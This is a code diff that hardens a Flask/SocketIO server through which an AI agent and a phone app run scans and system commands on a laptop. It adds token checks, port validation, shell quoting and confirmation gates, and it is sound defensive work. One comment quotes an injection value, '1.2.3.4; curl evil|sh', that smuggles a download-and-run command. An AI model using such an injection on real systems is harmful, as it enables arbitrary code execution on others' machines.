@@ -56,6 +56,8 @@ import base64
 import pty
 import json
 import re
+import hmac
+import shlex
 import select
 import fcntl
 import struct
@@ -90,7 +92,10 @@ except Exception:
 
 app = Flask(__name__)
 # Permitir buffers maiores para media e logs detalhados para debug
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading", ping_timeout=60, ping_interval=25, max_http_buffer_size=25 * 1024 * 1024)
+_CORS = [o.strip() for o in os.environ.get(
+    "SPOOK_CORS_ORIGINS", "http://127.0.0.1:5000,http://100.78.69.110:5000"
+).split(",") if o.strip()]
+socketio = SocketIO(app, cors_allowed_origins=_CORS, async_mode="threading", ping_timeout=60, ping_interval=25, max_http_buffer_size=25 * 1024 * 1024)
 
 chave_privada = gerar_ou_carregar_chaves()
 chave_publica_pem = chave_privada.public_key().public_bytes(
@@ -419,7 +424,11 @@ def montar_instrucoes_ia():
 
 
 @socketio.on("connect", namespace="/ia")
-def conectar_ia():
+def conectar_ia(auth=None):
+    # O /ia executa scans e comandos na maquina: exige o mesmo token do app.
+    if not validar_conexao_socket(auth, "connect_ia"):
+        print("[ERRO] /ia: token invalido ou ausente.", flush=True)
+        return False
     if AGENTE_LOCAL:
         try:
             if agente_runtime.disponivel():
@@ -654,8 +663,12 @@ def executar_scan_ia(nome_scan, alvo="", portas=""):
         lista = [p for p in re.split(r"[,\s]+", str(portas)) if p]
         if not lista:
             return {"ok": False, "erro": "Scan requer portas."}
+        if any(not re.fullmatch(r"\d{1,5}(-\d{1,5})?", p) for p in lista):
+            return {"ok": False, "erro": "Portas invalidas (use 80 ou 80,443 ou 1-1024)."}
         portas = " ".join(lista)
-    comando = cmd_template.format(alvo=alvo or "", portas=portas)
+    # shlex.quote: o alvo vem da IA (texto nao confiavel). Sem isso um alvo
+    # como "1.2.3.4; curl evil|sh" rodaria comando arbitrario no notebook.
+    comando = cmd_template.format(alvo=shlex.quote(alvo or ""), portas=portas)
     nome_arquivo = nome_arquivo_seguro(nome_scan.replace(" ", "_"))
     try:
         resultado = subprocess.run(
@@ -681,6 +694,10 @@ def executar_comando_ia(nome_comando):
             break
     if item is None:
         return {"ok": False, "erro": f"Comando não encontrado: {nome_comando}"}
+    if item.get("confirmar"):
+        # Suspend/Shutdown/Reboot: no app o usuario confirma na tela; a IA
+        # (tool_call vindo de texto do modelo) nao tem como confirmar.
+        return {"ok": False, "erro": f"Comando '{nome_comando}' exige confirmacao do usuario; a IA nao executa."}
     comando = item["comando"]
     try:
         _detectar_env_hypr()
@@ -758,7 +775,9 @@ def validar_conexao_socket(auth, contexto):
     if not token:
         return False
     token_atual = obter_token_sessao()
-    return token == token_atual
+    if not token_atual:
+        return False
+    return hmac.compare_digest(str(token), str(token_atual))
 
 
 def coletar_metricas():
@@ -806,9 +825,8 @@ def emitir_metricas_periodicas():
 
 @socketio.on("connect")
 def ao_conectar(auth=None):
-    print(f"[CONNECT] Auth recebido: {auth}", flush=True)
     if not validar_conexao_socket(auth, "connect"):
-        print(f"[ERRO] Token inválido ou ausente. Auth: {auth}", flush=True)
+        print("[ERRO] Token invalido ou ausente.", flush=True)
         return False
     print("[CONECTADO] Celular via WebSocket (token válido).", flush=True)
     metricas = coletar_metricas()
@@ -1232,7 +1250,8 @@ def arquivo_link():
 def rota_upload_media():
     auth_header = request.headers.get("Authorization", "")
     token = auth_header.replace("Bearer ", "").strip()
-    if not token or token != obter_token_sessao():
+    token_atual = obter_token_sessao()
+    if not token or not token_atual or not hmac.compare_digest(str(token), str(token_atual)):
         return {"ok": False, "erro": "Unauthorized"}, 401
 
     if "file" not in request.files:
@@ -1264,7 +1283,8 @@ def rota_listar_relatorios():
     """Lista os relatorios gerados no Arch (scans da IA, diagnosticos, comandos)."""
     auth_header = request.headers.get("Authorization", "")
     token = auth_header.replace("Bearer ", "").strip()
-    if not token or token != obter_token_sessao():
+    token_atual = obter_token_sessao()
+    if not token or not token_atual or not hmac.compare_digest(str(token), str(token_atual)):
         return {"ok": False, "erro": "Unauthorized"}, 401
     try:
         itens = []
